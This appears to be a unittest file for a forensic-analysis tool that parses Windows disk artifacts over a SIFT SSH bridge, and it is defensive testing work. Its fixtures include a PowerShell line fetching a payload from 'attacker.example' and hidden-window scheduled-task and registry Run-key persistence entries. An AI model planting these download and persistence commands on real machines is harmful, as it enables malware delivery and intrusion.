from __future__ import annotations

from pathlib import Path
from tempfile import TemporaryDirectory
import importlib.util
import json
import sqlite3
import subprocess
import unittest
from unittest.mock import patch

from findevil import remote as remote_module
from findevil.case_data import CaseDataset
from findevil.evaluation import evaluate_request
from findevil.mcp_server import CaseTraceMCPServer
from findevil.orchestrator import AnalysisOrchestrator
from findevil.remote import RemoteSIFTRunner
from findevil.schemas import CaseRequest
from findevil.tools import mount_image_readonly_tool, ToolContext
from findevil.store import RunArtifactStore
from findevil.schemas import AnalysisState


ROOT = Path(__file__).resolve().parents[1]
SAMPLE_CASE = ROOT / "sample_cases" / "windows_persistence_case"
BRIDGE = ROOT / "scripts" / "sift_tool_bridge.py"
BRIDGE_SPEC = importlib.util.spec_from_file_location("sift_tool_bridge", BRIDGE)
BRIDGE_MODULE = importlib.util.module_from_spec(BRIDGE_SPEC)
assert BRIDGE_SPEC is not None and BRIDGE_SPEC.loader is not None
BRIDGE_SPEC.loader.exec_module(BRIDGE_MODULE)
BOOTSTRAP = ROOT / "scripts" / "bootstrap_utm_sift_vm.py"
BOOTSTRAP_SPEC = importlib.util.spec_from_file_location("bootstrap_utm_sift_vm", BOOTSTRAP)
BOOTSTRAP_MODULE = importlib.util.module_from_spec(BOOTSTRAP_SPEC)
assert BOOTSTRAP_SPEC is not None and BOOTSTRAP_SPEC.loader is not None
BOOTSTRAP_SPEC.loader.exec_module(BOOTSTRAP_MODULE)


class AnalysisTests(unittest.TestCase):
    def test_sample_case_produces_traceable_findings(self) -> None:
        with TemporaryDirectory() as temp_dir:
            request = CaseRequest(
                case_path=str(SAMPLE_CASE),
                disk_path=str(SAMPLE_CASE / "image.E01"),
                output_path=str(Path(temp_dir) / "run"),
                profile="windows",
                max_iterations=3,
            )
            result = AnalysisOrchestrator().run(request)

            self.assertGreaterEqual(result.summary.findings_count, 3)
            self.assertGreaterEqual(result.summary.confirmed_count, 1)
            self.assertTrue((Path(request.output_path) / "report.md").exists())
            self.assertTrue((Path(request.output_path) / "tool_calls.jsonl").exists())
            self.assertTrue(any(issue.issue_type == "unsupported_claim" for issue in result.state.issues))
            self.assertEqual(result.summary.token_usage["total_tokens"], 0)

    def test_evaluate_shows_iteration_improvement(self) -> None:
        with TemporaryDirectory() as temp_dir:
            request = CaseRequest(
                case_path=str(SAMPLE_CASE),
                disk_path=str(SAMPLE_CASE / "image.E01"),
                output_path=str(Path(temp_dir) / "eval"),
                profile="windows",
                max_iterations=3,
            )
            summary = evaluate_request(request)

            self.assertGreater(summary["delta"]["confirmed"], 0)
            self.assertLess(summary["delta"]["issues"], 0)
            self.assertTrue((Path(request.output_path) / "evaluation.json").exists())

    def test_missing_fixtures_raise_tool_failure_issue(self) -> None:
        with TemporaryDirectory() as temp_dir:
            case_dir = Path(temp_dir) / "partial_case"
            artifacts_dir = case_dir / "artifacts"
            artifacts_dir.mkdir(parents=True)
            (case_dir / "image.E01").write_text("placeholder", encoding="utf-8")
            (case_dir / "manifest.json").write_text(
                json.dumps(
                    {
                        "case_id": "partial-case",
                        "expected_artifacts": ["browser_history", "prefetch_summary", "timeline_mft"],
                    }
                ),
                encoding="utf-8",
            )
            (artifacts_dir / "browser_history.json").write_text(
                json.dumps(
                    [
                        {
                            "url": "https://cdn-login-check.example/invoice_update.zip",
                            "downloaded_path": "C:\\Users\\Analyst\\Downloads\\invoice_update.zip",
                        }
                    ]
                ),
                encoding="utf-8",
            )
            (artifacts_dir / "prefetch_summary.json").write_text(
                json.dumps(
                    [
                        {
                            "executable": "powershell.exe",
                            "path": "C:\\Users\\Analyst\\AppData\\Roaming\\update.ps1",
                            "run_count": 3,
                        }
                    ]
                ),
                encoding="utf-8",
            )
            (artifacts_dir / "user_logons.json").write_text(
                json.dumps([{"user": "Analyst", "logon_type": "Interactive"}]),
                encoding="utf-8",
            )

            request = CaseRequest(
                case_path=str(case_dir),
                disk_path=str(case_dir / "image.E01"),
                output_path=str(Path(temp_dir) / "run"),
                profile="windows",
                max_iterations=3,
            )
            result = AnalysisOrchestrator().run(request)
            self.assertTrue(any(issue.issue_type == "tool_failure" for issue in result.state.issues))

    def test_mcp_server_returns_structured_tool_output(self) -> None:
        with TemporaryDirectory() as temp_dir:
            request = CaseRequest(
                case_path=str(SAMPLE_CASE),
                disk_path=str(SAMPLE_CASE / "image.E01"),
                output_path=str(Path(temp_dir) / "mcp"),
                profile="windows",
            )
            server = CaseTraceMCPServer(request)
            init = server.handle_request({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}})
            tools = server.handle_request({"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}})
            called = server.handle_request(
                {
                    "jsonrpc": "2.0",
                    "id": 3,
                    "method": "tools/call",
                    "params": {"name": "case_info", "arguments": {}},
                }
            )

            self.assertEqual(init["result"]["serverInfo"]["name"], "casetrace-mcp")
            self.assertTrue(any(tool["name"] == "case_info" for tool in tools["result"]["tools"]))
            self.assertEqual(
                called["result"]["structuredContent"]["tool_name"],
                "case_info",
            )
            tool_calls = (Path(request.output_path) / "tool_calls.jsonl").read_text(encoding="utf-8")
            self.assertIn("\"token_usage\"", tool_calls)

    def test_remote_runner_builds_ssh_command(self) -> None:
        request = CaseRequest(
            case_path=str(SAMPLE_CASE),
            disk_path=str(SAMPLE_CASE / "image.E01"),
            output_path="runs/unused",
            tool_backend="sift-ssh",
            remote_host="dfir.example",
            remote_user="sift",
            remote_workdir="/home/sift/findevil",
            remote_disk_path="/cases/case1/image.E01",
        )
        runner = RemoteSIFTRunner(request)
        command = runner._build_command("timeline_mft")
        self.assertEqual(command[:3], ["ssh", "-p", "22"])
        self.assertIn("BatchMode=yes", command)
        self.assertIn("sift@dfir.example", command)
        self.assertIn("/home/sift/findevil/scripts/sift_tool_bridge.py", command)
        self.assertIn("/cases/case1/image.E01", command)

    def test_remote_runner_can_disable_host_key_check_for_disposable_vm(self) -> None:
        request = CaseRequest(
            case_path=str(SAMPLE_CASE),
            disk_path=str(SAMPLE_CASE / "image.E01"),
            output_path="runs/unused",
            tool_backend="sift-ssh",
            remote_host="127.0.0.1",
            remote_user="sift",
            remote_port=2222,
            remote_workdir="/home/sift/findevil",
            remote_identity_file="vm_assets/ssh/sift_vm_ed25519",
            remote_insecure_no_host_key_check=True,
        )
        runner = RemoteSIFTRunner(request)
        command = runner._build_self_test_command()

        self.assertIn("-i", command)
        self.assertIn("vm_assets/ssh/sift_vm_ed25519", command)
        self.assertIn("StrictHostKeyChecking=no", command)
        self.assertIn("UserKnownHostsFile=/dev/null", command)
        self.assertIn("sift@127.0.0.1", command)

    def test_remote_only_disk_path_is_reported_as_remote_image(self) -> None:
        request = CaseRequest(
            case_path=str(SAMPLE_CASE),
            disk_path=str(SAMPLE_CASE / "missing-public-image.dd"),
            output_path="runs/unused",
            tool_backend="sift-ssh",
            remote_host="127.0.0.1",
            remote_user="sift",
            remote_workdir="/home/sift/findevil",
            remote_disk_path="/home/sift/public_cases/cfreds-data-leakage-pc/cfreds_2015_data_leakage_pc.dd",
        )
        dataset = CaseDataset(request)

        self.assertEqual(dataset.disk_access_mode(), "remote_read_only_image")

    def test_mount_tool_uses_remote_disk_path_for_remote_only_image(self) -> None:
        with TemporaryDirectory() as temp_dir:
            request = CaseRequest(
                case_path=str(SAMPLE_CASE),
                disk_path=str(SAMPLE_CASE / "missing-public-image.dd"),
                output_path=str(Path(temp_dir) / "run"),
                tool_backend="sift-ssh",
                remote_host="127.0.0.1",
                remote_user="sift",
                remote_workdir="/home/sift/findevil",
                remote_disk_path="/home/sift/public_cases/cfreds-data-leakage-pc/cfreds_2015_data_leakage_pc.dd",
            )
            store = RunArtifactStore(request.output_path)
            store.prepare()
            execution = mount_image_readonly_tool(
                ToolContext(
                    request=request,
                    dataset=CaseDataset(request),
                    store=store,
                    state=AnalysisState(case_id="remote-only"),
                    iteration=1,
                ),
                {},
            )

            self.assertEqual(execution.result.data["records"][0]["access_mode"], "remote_read_only_image")
            self.assertEqual(
                execution.result.data["records"][0]["mount_path"],
                "/home/sift/public_cases/cfreds-data-leakage-pc/cfreds_2015_data_leakage_pc.dd",
            )

    def test_remote_runner_parses_json_payload(self) -> None:
        request = CaseRequest(
            case_path=str(SAMPLE_CASE),
            disk_path=str(SAMPLE_CASE / "image.E01"),
            output_path="runs/unused",
            tool_backend="sift-ssh",
            remote_host="dfir.example",
            remote_workdir="/home/sift/findevil",
        )
        runner = RemoteSIFTRunner(request)

        completed = subprocess.CompletedProcess(
            args=["ssh"],
            returncode=0,
            stdout=json.dumps({"records": [{"path": "C:\\foo", "action": "observed"}], "errors": []}),
            stderr="",
        )

        with patch.object(remote_module.subprocess, "run", return_value=completed):
            result = runner.run_tool("timeline_mft")

        self.assertEqual(result.payload["records"][0]["path"], "C:\\foo")
        self.assertEqual(result.payload["errors"], [])

    def test_remote_runner_rejects_placeholder_host(self) -> None:
        request = CaseRequest(
            case_path=str(SAMPLE_CASE),
            disk_path=str(SAMPLE_CASE / "image.E01"),
            output_path="runs/unused",
            tool_backend="sift-ssh",
            remote_host="your-sift-host",
            remote_workdir="/home/sift/findevil",
        )
        runner = RemoteSIFTRunner(request)
        result = runner.run_self_test()
        self.assertTrue(result.payload["errors"])
        self.assertIn("Replace the placeholder", result.payload["errors"][0])

    def test_remote_runner_returns_json_failure_on_timeout(self) -> None:
        request = CaseRequest(
            case_path=str(SAMPLE_CASE),
            disk_path=str(SAMPLE_CASE / "image.E01"),
            output_path="runs/unused",
            tool_backend="sift-ssh",
            remote_host="127.0.0.1",
            remote_user="sift",
            remote_workdir="/home/sift/findevil",
            remote_timeout_sec=3,
        )
        runner = RemoteSIFTRunner(request)
        timeout = subprocess.TimeoutExpired(cmd=["ssh"], timeout=3)

        with patch.object(remote_module.subprocess, "run", side_effect=timeout):
            result = runner.run_self_test()

        self.assertEqual(result.exit_code, 124)
        self.assertIn("timed out", result.payload["errors"][0])

    def test_bridge_directory_mode_extracts_prefetch(self) -> None:
        with TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            prefetch_dir = root / "Windows" / "Prefetch"
            prefetch_dir.mkdir(parents=True)
            (prefetch_dir / "POWERSHELL.EXE-12345678.pf").write_text("pf", encoding="utf-8")

            completed = subprocess.run(
                ["python3", str(BRIDGE), "--tool", "prefetch_summary", "--disk", str(root)],
                capture_output=True,
                text=True,
                check=False,
            )
            payload = json.loads(completed.stdout)
            self.assertEqual(completed.returncode, 0)
            self.assertEqual(payload["records"][0]["executable"], "powershell.exe")

    def test_bridge_directory_mode_extracts_scheduled_task(self) -> None:
        with TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            task_file = root / "Windows" / "System32" / "Tasks" / "AdobeUpdaterCheck"
            task_file.parent.mkdir(parents=True)
            task_file.write_text(
                """<?xml version="1.0" encoding="UTF-16"?>
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><URI>\\AdobeUpdaterCheck</URI></RegistrationInfo>
  <Triggers><LogonTrigger /></Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -File C:\\Users\\Analyst\\AppData\\Roaming\\update.ps1</Arguments>
    </Exec>
  </Actions>
</Task>
""",
                encoding="utf-16",
            )
            completed = subprocess.run(
                ["python3", str(BRIDGE), "--tool", "scheduled_tasks", "--disk", str(root)],
                capture_output=True,
                text=True,
                check=False,
            )
            payload = json.loads(completed.stdout)
            self.assertEqual(completed.returncode, 0)
            self.assertEqual(payload["records"][0]["task_name"], "AdobeUpdaterCheck")
            self.assertEqual(payload["records"][0]["command"], "powershell.exe")

    def test_bridge_directory_mode_extracts_browser_history(self) -> None:
        with TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            history = root / "Users" / "Analyst" / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "History"
            history.parent.mkdir(parents=True)
            connection = sqlite3.connect(history)
            connection.execute("CREATE TABLE urls (url TEXT, title TEXT, visit_count INTEGER, last_visit_time INTEGER)")
            connection.execute(
                "INSERT INTO urls VALUES (?, ?, ?, ?)",
                ("https://cdn-delivery.example/invoice_update.zip", "invoice", 1, 123),
            )
            connection.commit()
            connection.close()

            completed = subprocess.run(
                ["python3", str(BRIDGE), "--tool", "browser_history", "--disk", str(root)],
                capture_output=True,
                text=True,
                check=False,
            )
            payload = json.loads(completed.stdout)
            self.assertEqual(completed.returncode, 0)
            self.assertEqual(payload["records"][0]["url"], "https://cdn-delivery.example/invoice_update.zip")

    def test_bridge_directory_mode_scans_suspicious_file_content(self) -> None:
        with TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            script = root / "Users" / "Analyst" / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Themes" / "update.ps1"
            script.parent.mkdir(parents=True)
            script.write_text("powershell Invoke-WebRequest http://attacker.example/payload", encoding="utf-8")

            completed = subprocess.run(
                ["python3", str(BRIDGE), "--tool", "yara_scan", "--disk", str(root)],
                capture_output=True,
                text=True,
                check=False,
            )
            payload = json.loads(completed.stdout)
            self.assertEqual(completed.returncode, 0)
            self.assertEqual(payload["records"][0]["rule"], "Inline_Suspicious_Windows_Artifact")

    def test_bridge_parser_extracts_registry_autorun_records(self) -> None:
        sample = """
Software\\Microsoft\\Windows\\CurrentVersion\\Run
Launch String : ThemeUpdater
Value : powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Analyst\\AppData\\Roaming\\update.ps1
"""
        records = BRIDGE_MODULE.parse_regripper_output(sample, "NTUSER.DAT", "run")
        self.assertEqual(records[0]["entry"], "ThemeUpdater")
        self.assertIn("powershell.exe", records[0]["value"])

    def test_bridge_parser_extracts_registry_export_autoruns(self) -> None:
        sample = r'''
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"ThemeUpdater"="powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Analyst\\AppData\\Roaming\\update.ps1"
'''
        records = BRIDGE_MODULE.parse_registry_export(sample, "autoruns.reg")
        self.assertEqual(records[0]["entry"], "ThemeUpdater")
        self.assertIn("powershell.exe", records[0]["value"])

    def test_bridge_parser_extracts_security_logons(self) -> None:
        sample = """
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>4624</EventID></System>
  <EventData>
    <Data Name="TargetUserName">Analyst</Data>
    <Data Name="LogonType">2</Data>
    <Data Name="IpAddress">127.0.0.1</Data>
  </EventData>
</Event>
"""
        records = BRIDGE_MODULE.parse_security_events_xml(sample, "Security.evtx")
        self.assertEqual(records[0]["user"], "Analyst")
        self.assertEqual(records[0]["event_id"], "4624")

    def test_bridge_parser_extracts_amcache_records(self) -> None:
        sample = """
Name: powershell.exe
Path: C:\\Users\\Analyst\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\update.ps1
SHA1: deadbeef
"""
        records = BRIDGE_MODULE.parse_amcache_output(sample, "Amcache.hve")
        self.assertEqual(records[0]["program_name"], "powershell.exe")
        self.assertIn("update.ps1", records[0]["path"])

    def test_bridge_detects_ntfs_partition_offset(self) -> None:
        completed = subprocess.CompletedProcess(
            args=["mmls"],
            returncode=0,
            stdout="""
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0001023999   0001021952   NTFS / exFAT (0x07)
""",
            stderr="",
        )
        with patch.object(BRIDGE_MODULE, "run_command", return_value=completed):
            offset = BRIDGE_MODULE.detect_filesystem_offset(Path("disk.E01"))
        self.assertEqual(offset, "0000002048")

    def test_bridge_prefers_larger_ntfs_partition_for_windows_image(self) -> None:
        completed = subprocess.CompletedProcess(
            args=["mmls"],
            returncode=0,
            stdout="""
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000206847   0000204800   NTFS / exFAT (0x07)
003:  000:001   0000206848   0041940991   0041734144   NTFS / exFAT (0x07)
""",
            stderr="",
        )
        with patch.object(BRIDGE_MODULE, "run_command", return_value=completed):
            offset = BRIDGE_MODULE.detect_filesystem_offset(Path("disk.E01"))
        self.assertEqual(offset, "0000206848")

    def test_bridge_extracts_mft_from_image_before_analyzemft(self) -> None:
        entries = [{"path": "$MFT", "address": "0", "local_path": None, "offset": "2048"}]
        expected = [{"path": "C:\\Users\\Analyst\\Downloads\\invoice_update.zip", "action": "observed"}]
        with patch.object(BRIDGE_MODULE, "read_entry_bytes", return_value=b"mft-bytes") as read_entry:
            with patch.object(BRIDGE_MODULE, "timeline_from_analyzemft", return_value=expected) as analyze:
                records = BRIDGE_MODULE.timeline_from_entries(Path("disk.E01"), entries)

        self.assertEqual(records, expected)
        read_entry.assert_called_once()
        self.assertTrue(analyze.call_args.args[0].name == "$MFT")

    def test_bridge_self_test_reports_supported_tools(self) -> None:
        completed = subprocess.run(
            ["python3", str(BRIDGE), "--self-test"],
            capture_output=True,
            text=True,
            check=False,
        )
        payload = json.loads(completed.stdout)
        self.assertEqual(completed.returncode, 0)
        self.assertIn("registry_autoruns", payload["supported_tools"])

    def test_bootstrap_renders_network_config_for_jammy_guest(self) -> None:
        with TemporaryDirectory() as temp_dir:
            cloud_init_dir = Path(temp_dir) / "cloud-init"
            cloud_init_dir.mkdir(parents=True)
            public_key = Path(temp_dir) / "id_ed25519.pub"
            public_key.write_text("ssh-ed25519 AAAATEST example@test", encoding="utf-8")
            mac_address = "52:54:00:11:22:33"

            with patch.object(BOOTSTRAP_MODULE, "CLOUD_INIT_DIR", cloud_init_dir):
                user_data, _, network_config = BOOTSTRAP_MODULE.render_cloud_init(public_key, "sift", "sift-vm", "sift", mac_address)

            self.assertTrue(network_config.exists())
            self.assertIn("/etc/netplan/01-utm-dhcp.yaml", user_data.read_text(encoding="utf-8"))
            self.assertIn(mac_address, network_config.read_text(encoding="utf-8"))
            self.assertIn("dhcp4: true", network_config.read_text(encoding="utf-8"))

    def test_bootstrap_candidate_guest_ips_include_shared_network_fallback(self) -> None:
        completed = subprocess.CompletedProcess(args=["utmctl"], returncode=1, stdout="", stderr="guest agent unavailable")
        with patch.object(BOOTSTRAP_MODULE.subprocess, "run", return_value=completed):
            candidates = BOOTSTRAP_MODULE.candidate_guest_ips("SIFT Ubuntu 22.04 x86_64")
        self.assertEqual(candidates[0], "192.168.64.2")
        self.assertIn("192.168.64.10", candidates)

    def test_hardened_install_scripts_have_valid_shell_syntax(self) -> None:
        for script in (
            ROOT / "scripts" / "install_sift_in_guest.sh",
            ROOT / "scripts" / "install_sift_guest_payload.sh",
            ROOT / "scripts" / "rebuild_utm_sift_vm.sh",
            ROOT / "scripts" / "image_and_analyze.sh",
        ):
            completed = subprocess.run(
                ["bash", "-n", str(script)],
                capture_output=True,
                text=True,
                check=False,
            )
            self.assertEqual(completed.returncode, 0, msg=f"{script} failed shell syntax check: {completed.stderr}")


if __name__ == "__main__":
    unittest.main()
